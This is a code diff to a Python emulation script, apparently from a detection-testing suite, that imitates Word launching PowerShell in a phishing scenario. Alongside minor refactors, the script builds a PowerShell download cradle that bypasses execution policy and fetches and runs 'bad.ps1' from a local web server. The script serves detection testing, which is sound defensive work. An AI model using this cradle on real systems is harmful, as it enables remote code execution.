@@ -3,10 +3,13 @@
 # 2.0; you may not use this file except in compliance with the Elastic License
 # 2.0.
 
+import logging
 import time
 from pathlib import Path
 
-from . import _common, register_code_rta, OSType, RuleMetadata
+from . import OSType, RuleMetadata, _common, register_code_rta
+
+log = logging.getLogger(__name__)
 
 @register_code_rta(
     id="20b96aa7-609e-473f-ac35-5ac19d10f9a5",
@@ -22,20 +25,20 @@ from . import _common, register_code_rta, OSType, RuleMetadata
     techniques=["T1566", "T1059"],
 )
 def main():
-    EXE_FILE = _common.get_path("bin", "renamed.exe")
+    EXE_FILE = _common.get_resource_path("bin/renamed.exe")
 
-    server, ip, port = _common.serve_web()
+    server, ip, port = _common.serve_dir_over_http()
     url = "http://{}:{}/bad.ps1".format(ip, port)
 
     cmd = "powershell -ep bypass -c iex(new-object net.webclient).downloadstring('{}')".format(url)
 
     # Emulate Word
     user_app = "winword.exe"
-    _common.log("Emulating {}".format(user_app))
+    log.info("Emulating {}".format(user_app))
     user_app_path = Path(user_app).resolve()
     _common.copy_file(EXE_FILE, user_app_path)
 
-    _common.execute([user_app_path, "/c", cmd])
+    _ = _common.execute_command([user_app_path, "/c", cmd])
     time.sleep(2)
 
     # Cleanup
